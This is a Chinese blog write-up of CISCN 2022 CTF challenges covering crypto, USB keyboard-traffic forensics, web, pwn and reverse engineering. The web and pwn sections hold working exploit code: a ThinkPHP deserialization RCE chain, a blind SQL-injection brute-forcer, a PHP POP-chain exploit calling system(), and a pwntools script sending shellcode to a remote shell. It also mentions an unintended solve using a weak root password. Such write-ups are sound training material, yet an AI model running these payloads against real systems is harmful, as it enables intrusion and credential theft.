@@ -1,0 +1,519 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>CISCN2022 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">CISCN2022</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/">2022-06-20</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到:"></a>签到:</h2><p>根据公众号给的提示，可构造出脚本</p>
+<pre><code>a=&#39;5543053560369047024142002765898038342775948119489181360354534575324142175929505171739721800870791249314864251567972295612874802183218042622056229755674962381242884261754543945970151712920835729189983000341612995263262927255805323073625456260457938936828798227686401899839962031005363203251056213941366146686875718432385301325733733171999005964405664494560905422663352160064965067318132130228461655121372448333527884088007285116323305598946651171485490621766011242810388503390388653399069240050404600114824579296172741241184113479&#39;
+a=a[0:28]
+tmp=&#39;0&#39;
+b=&#39;1732251413440356045166710055&#39;
+for i in range(28):
+    print((ord(a[i])+ord(b[i])-2*ord(tmp[0]))%10,end=&quot;&quot;)
+</code></pre>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121548778.png" alt="image-20220529121548778"></p>
+<p>访问url:</p>
+<p>xxx/send?msg=s</p>
+<p>再访问</p>
+<p>xxx/send?msg=6275204973709393069208712710</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529121645372.png" alt="image-20220529121645372"></p>
+<h2 id="基于挑战码的双向认证1"><a href="#基于挑战码的双向认证1" class="headerlink" title="基于挑战码的双向认证1"></a>基于挑战码的双向认证1</h2><h2 id="基于挑战码的双向认证2"><a href="#基于挑战码的双向认证2" class="headerlink" title="基于挑战码的双向认证2"></a>基于挑战码的双向认证2</h2><p>非预期解:</p>
+<p>连接ssh</p>
+<p>进入</p>
+<p>/root/cube-shell/instance/flag_server 目录</p>
+<p>两个flag全在里面</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529124444190.png" alt="image-20220529124444190"></p>
+<h2 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h2><p>非预期</p>
+<p>连接ssh</p>
+<p>进入</p>
+<p>/root/cube-shell/instance/flag_server 目录</p>
+<p>su root</p>
+<p>弱口令密码:toor</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529142614152.png" alt="image-20220529142614152"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>直接填问卷即可得到flag</p>
+<h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><pre><code>tshark -T json -r ez_usb.pcapng &gt; data.json
+</code></pre>
+<p>导出json数据</p>
+<p>经过分析，它是有两个键盘流量。</p>
+<p>分离一下</p>
+<pre><code>import json
+jsonData=&quot;&quot;
+with open(&quot;data.json&quot;) as f:
+    text=f.read()
+    jsonData=json.loads(text)
+data_1=&quot;&quot;
+data_2=&quot;&quot;
+for i in jsonData:
+    try:
+        if i[&quot;_source&quot;][&quot;layers&quot;][&quot;usb&quot;][&quot;usb.src&quot;]==&quot;2.8.1&quot;:
+            data_1+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;
+        else:
+            data_2+=i[&quot;_source&quot;][&quot;layers&quot;][&quot;usbhid.data&quot;]+&quot;\n&quot;
+    except:
+        pass
+print(data_1)
+print(data_2)
+</code></pre>
+<p>分别保存为1.txt,2.txt</p>
+<p>使用网上现成得脚本进行提取数据</p>
+<pre><code class="python">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
+shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
+output = []
+keys = open(&#39;1.txt&#39;) //2.txt
+for line in keys:
+    try:
+        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:
+             continue
+        if line[6:8] in normalKeys.keys():
+            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]
+        else:
+            output += [&#39;[unknown]&#39;]
+    except:
+        pass
+keys.close()
+
+flag=0
+print(&quot;&quot;.join(output))
+for i in range(len(output)):
+    try:
+        a=output.index(&#39;&lt;DEL&gt;&#39;)
+        del output[a]
+        del output[a-1]
+    except:
+        pass
+for i in range(len(output)):
+    try:
+        if output[i]==&quot;&lt;CAP&gt;&quot;:
+            flag+=1
+            output.pop(i)
+            if flag==2:
+                flag=0
+        if flag!=0:
+            output[i]=output[i].upper()
+    except:
+        pass
+print (&#39;output :&#39; + &quot;&quot;.join(output))
+</code></pre>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529144605125.png" alt="image-20220529144605125"></p>
+<p>发现是一个压缩包，第二个为密码</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145500226.png" alt="image-20220529145500226"></p>
+<p>解开即可得到flag</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145515024.png" alt="image-20220529145515024"></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>使用的</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p>
+<p>exp:</p>
+<pre><code class="php">&lt;?php
+namespace think&#123;
+    abstract class Model&#123;
+        private $lazySave = false;
+        private $data = [];
+        private $exists = false;
+        protected $table;
+        private $withAttr = [];
+        protected $json = [];
+        protected $jsonAssoc = false;
+        function __construct($obj = &#39;&#39;)&#123;
+            $this-&gt;lazySave = True;
+            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;cat /flag.txt&#39;]];
+            $this-&gt;exists = True;
+            $this-&gt;table = $obj;
+            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];
+            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];
+            $this-&gt;jsonAssoc = True;
+        &#125;
+    &#125;
+&#125;
+namespace think\model&#123;
+    use think\Model;
+    class Pivot extends Model&#123;
+    &#125;
+&#125;
+
+namespace&#123;
+    echo(urlencode((serialize(new think\model\Pivot(new think\model\Pivot())))));
+&#125;
+</code></pre>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173238834.png" alt="image-20220529173238834"></p>
+<p>ls / 查看</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173416181.png" alt="image-20220529173416181"></p>
+<p>读flag</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529111702941.png" alt="image-20220529111702941"></p>
+<h2 id="ezpentest"><a href="#ezpentest" class="headerlink" title="ezpentest"></a>ezpentest</h2><p>waf脚本如下:</p>
+<pre><code class="php">&lt;?php
+function safe($a) &#123;
+    $r = preg_replace(&#39;/[\s,()#;*~\-]/&#39;,&#39;&#39;,$a);
+    $r = preg_replace(&#39;/^.*(?=union|binary|regexp|rlike).*$/i&#39;,&#39;&#39;,$r);
+    return (string)$r;
+  &#125;
+?&gt;
+</code></pre>
+<p>在比赛中是没有给出代码的</p>
+<p>考察sql注入，和2022虎符babysql很相似。</p>
+<p>可利用case when注入，可构造出payload</p>
+<pre><code>0&#39;||case&#39;1&#39;when`password`collate&#39;utf8mb4_bin&#39;like&#39;&#123;&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;
+</code></pre>
+<p>过滤了取反导致不能利用<del>0+1来制造溢出,但是我们可以利用 18446744073709551615+1(它就代表</del>0+1)来制造出溢出，当匹配到正确字符时，服务器会报500，否则就返回’0’，服务器会报error。或者用9223372036854775807+1也行</p>
+<p>由此可构造出脚本:</p>
+<pre><code class="python">import requests
+import string
+
+url = &#39;http://1.14.71.254:28470/login.php&#39;
+result = &#39;&#39;
+ceshi = &#39;&#39;
+lis = string.ascii_letters + string.digits + &quot;^!%@_$%*&quot;
+gl = &quot;%*()_&quot;
+while 1:
+    for i in lis:
+            if i in gl:  # 这里是对like正则匹配中的一些特殊符号进行转义
+                i = &quot;\\&quot; + i
+            ceshi = result + i
+            payload = &quot;0&#39;||case&#39;1&#39;when`username`collate&#39;utf8mb4_bin&#39;like&#39;&#123;0&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;&quot;.format(ceshi)
+            #print(payload)
+            #username 改为 password即可得到密码
+            data = &#123;
+                &quot;username&quot;: &quot;666&quot;,
+                &quot;password&quot;: payload
+            &#125;
+            response = requests.post(url, data=data)
+            if response.status_code == 500:
+                print(&quot;success!&quot;)
+                result = result + i
+                res2 = result
+                print(res2.replace(&quot;\\&quot;,&quot;&quot;))
+                break
+            elif response.status_code == 0:
+                continue
+            else:
+                continue
+</code></pre>
+<p>可得到账号密码:</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/7%25@@JT7XEDZVT%5DEG%7D%7BJWNSG.png" alt="img"></p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010207219.png" alt="image-20220604010207219"></p>
+<pre><code>nssctfwabbybaboo!@$%!!
+PAssw40d_Y0u3_Never_Konwn!@!!
+</code></pre>
+<p>进去后得到一串乱码文件</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010331417.png" alt="image-20220604010331417"></p>
+<p>查看源代码</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010813177.png" alt="image-20220604010813177"></p>
+<p>发现是phpjiami加密</p>
+<p>github有相应的工具:<a target="_blank" rel="noopener" href="https://github.com/wenshui2008/phpjiami_decode">https://github.com/wenshui2008/phpjiami_decode</a></p>
+<p>但是如果直接复制粘贴下来解密大部分情况都会漏字符，而phpjiami这里解密相对比较苛刻，少一个字符都会解密失败，可以采用脚本把混淆代码保存下来再解密，把url和cookie改成你的就可以了</p>
+<pre><code class="php">&lt;?php
+$url =&quot;http://1.14.71.254:28470/login.php&quot;;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt ($ch, CURLOPT_COOKIE, &quot;_ga=GA1.1.1492528755.1648872076; session=6fdc00cf-2ec3-4924-b99b-b474ac227c2d; PHPSESSID=cbdac7b296d255ad4c2c69066c4356ec&quot;);
+$result = curl_exec($ch);
+curl_close($ch);
+echo urlencode($result);
+file_put_contents(&quot;pop.php&quot;,$result);
+?&gt;
+</code></pre>
+<p>将生成的文件放入解密脚本</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604013234468.png" alt="image-20220604013234468"></p>
+<p>最终得到一下代码</p>
+<pre><code class="php">&lt;?php
+session_start();
+if(!isset($_SESSION[&#39;login&#39;]))&#123;
+    die();
+&#125;
+function Al($classname)&#123;
+    include $classname.&quot;.php&quot;;
+&#125;
+
+if(isset($_REQUEST[&#39;a&#39;]))&#123;
+    $c = $_REQUEST[&#39;a&#39;];
+    $o = unserialize($c);
+    if($o === false) &#123;
+        die(&quot;Error Format&quot;);
+    &#125;else&#123;
+        spl_autoload_register(&#39;Al&#39;);
+        $o = unserialize($c);
+        $raw = serialize($o);
+        if(preg_match(&quot;/Some/i&quot;,$raw))&#123;
+            throw new Error(&quot;Error&quot;);
+        &#125;
+        $o = unserialize($raw);
+        var_dump($o);
+    &#125;
+&#125;else &#123;
+    echo file_get_contents(&quot;SomeClass.php&quot;);
+&#125;
+</code></pre>
+<p>访问:</p>
+<pre><code>view-source:http://1.14.71.254:28470/1Nd3x_Y0u_N3v3R_Kn0W.php
+</code></pre>
+<p>可得到someclass的代码</p>
+<pre><code class="php">&lt;?php
+class A
+&#123;
+    public $a;
+    public $b;
+    public function see()
+    &#123;
+        $b = $this-&gt;b;
+        $checker = new ReflectionClass(get_class($b));
+        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;
+            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;
+                ($b-&gt;a)($b-&gt;b.&quot;&quot;);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+class B
+&#123;
+    public $a;
+    public $b;
+    public function __toString()
+    &#123;
+        $this-&gt;a-&gt;see();
+        return &quot;1&quot;;
+    &#125;
+&#125;
+class C
+&#123;
+    public $a;
+    public $b;
+    public function __toString()
+    &#123;
+        $this-&gt;a-&gt;read();
+        return &quot;lock lock read!&quot;;
+    &#125;
+&#125;
+class D
+&#123;
+    public $a;
+    public $b;
+    public function read()
+    &#123;
+        $this-&gt;b-&gt;learn();
+    &#125;
+&#125;
+class E
+&#123;
+    public $a;
+    public $b;
+    public function __invoke()
+    &#123;
+        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;
+    &#125;
+    public function __destruct()&#123;
+        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了
+        //echo &quot;???&quot;;
+        die($this-&gt;a);
+    &#125;
+&#125;
+class F
+&#123;
+    public $a;
+    public $b;
+    public function __call($t1,$t2)
+    &#123;
+        $s1 = $this-&gt;b;
+        $s1();
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>构造pop链，进行反序列化</p>
+<p><strong>spl_autoload_register的作用就是把后面反序列化不存在的类所在的文件加载进来</strong></p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604015509088.png" alt="image-20220604015509088"></p>
+<p>由于漏洞代码在SomeClass.php中，所以我们必须包含这个文件。</p>
+<p>这里存在一个过滤</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170012434.png" alt="image-20220604170012434"></p>
+<p>我们需要让它包含后直接进入destruct魔术函数</p>
+<p>关于gc回收机制可参考这篇文章，写的非常好:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/123520193">https://blog.csdn.net/qq_51295677/article/details/123520193</a></p>
+<p>pop链条的思路非常清晰：</p>
+<pre><code>E的destruct --&gt; B 的toString --&gt; A(rce点)
+</code></pre>
+<p>最终exp:</p>
+<pre><code class="php">&lt;?php
+class A
+&#123;
+    public $a;
+    public $b;
+    public function see()
+    &#123;
+        $b = $this-&gt;b;
+        $checker = new ReflectionClass(get_class($b));
+        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;
+            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;
+                ($b-&gt;a)($b-&gt;b.&quot;&quot;);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+class B
+&#123;
+    public $a;
+    public $b;
+    public function __toString()
+    &#123;
+        $this-&gt;a-&gt;see();
+        return &quot;1&quot;;
+    &#125;
+&#125;
+class C
+&#123;
+    public $a;
+    public $b;
+    public function __toString()
+    &#123;
+        $this-&gt;a-&gt;read();
+        return &quot;lock lock read!&quot;;
+    &#125;
+&#125;
+class D
+&#123;
+    public $a;
+    public $b;
+    public function read()
+    &#123;
+        $this-&gt;b-&gt;learn();
+    &#125;
+&#125;
+class E
+&#123;
+    public $a;
+    public $b;
+    public function __invoke()
+    &#123;
+        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;
+    &#125;
+    public function __destruct()&#123;
+        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了
+        //echo &quot;???&quot;;
+        die($this-&gt;a);
+    &#125;
+&#125;
+class F
+&#123;
+    public $a;
+    public $b;
+    public function __call($t1,$t2)
+    &#123;
+        $s1 = $this-&gt;b;
+        $s1();
+    &#125;
+&#125;
+class SomeClass&#123;
+    public $a;
+&#125;
+
+$a = new A();
+$b = new B();
+$e = new E();
+$e -&gt;a = $b; #die函数会把$b当作字符串输出，从而调用了toString魔术方法
+$b -&gt;a = $a;
+$arr = new ArrayObject(); #只要是php的原生类即可
+$arr -&gt; a = &quot;system&quot;;
+$arr -&gt; b = &quot;ls /&quot;;
+$a -&gt;b = $arr;
+$c = new SomeClass();
+$c -&gt;a =$e;
+echo(urlencode(str_replace(&quot;i:1&quot;,&quot;i:0&quot;,serialize(array($c,1)))))
+?&gt;
+</code></pre>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604165811456.png" alt="image-20220604165811456"></p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170425296.png" alt="image-20220604170425296"></p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>case1,确保unk_202028和unk_202024为1，</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174222620.png" alt="image-20220529174222620"></p>
+<p>case2:，unk_202028和unk_202028为1的时候执行写的shellcode，shellcode必须为可见字符：</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174438381.png" alt="image-20220529174438381"></p>
+<p>生成shellcode可见字符串：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140033280.png" alt="image-20220529140033280"></p>
+<p>exp：</p>
+<pre><code class="python">from pwn import*
+
+context.log_level = &quot;debug&quot;
+
+io = remote(&quot;123.56.111.202&quot;,17395)
+# io = process(&quot;./login&quot;)
+io.recv()
+shellcode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;
+payload = &quot;opt:1\n&quot; + &quot;msg:ro0t1\n&quot;
+io.sendline(payload)
+payload = &quot;opt:2\n&quot; + &quot;msg:&quot; + shellcode + &quot;\n&quot;
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140131706.png" alt="image-20220529140131706"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>swift的AST树</p>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201512778.png" alt="image-20220529201512778"></p>
+<p>参照swiftc的输出</p>
+<p>构造出脚本</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+unsigned char b[] = &#123;88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16&#125;;
+unsigned char k[] = &quot;345y&quot;;
+
+int main()
+&#123;
+    for (int i = 0; i &lt; 42 - 3; i++)
+    &#123;
+        unsigned char tmp = k[0];
+        k[0] = k[1];
+        k[1] = k[2];
+        k[2] = k[3];
+        k[3] = tmp;
+    &#125;
+    for (int i = 42 - 4; i &gt;= 0; i--)
+    &#123;
+        unsigned char r0 = b[i + 0], r1 = b[i + 1], r2 = b[i + 2], r3 = b[i + 3];
+        unsigned char tmp = k[3];
+        k[3] = k[2];
+        k[2] = k[1];
+        k[1] = k[0];
+        k[0] = tmp;
+        b[i + 0] = r2 ^ k[2];
+        b[i + 1] = r3 ^ k[3];
+        b[i + 2] = ((k[0] + (b[i + 0] &gt;&gt; 4)) &amp; 0xff) ^ r0;
+        b[i + 3] = ((k[1] + (b[i + 1] &gt;&gt; 2)) &amp; 0xff) ^ r1;
+    &#125;
+    for (int i = 0; i &lt; 42; i++)
+    &#123;
+        printf(&quot;%c&quot;, b[i]);
+    &#125;
+    return 0;
+&#125;
+</code></pre>
+<p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201614424.png" alt="image-20220529201614424"></p>
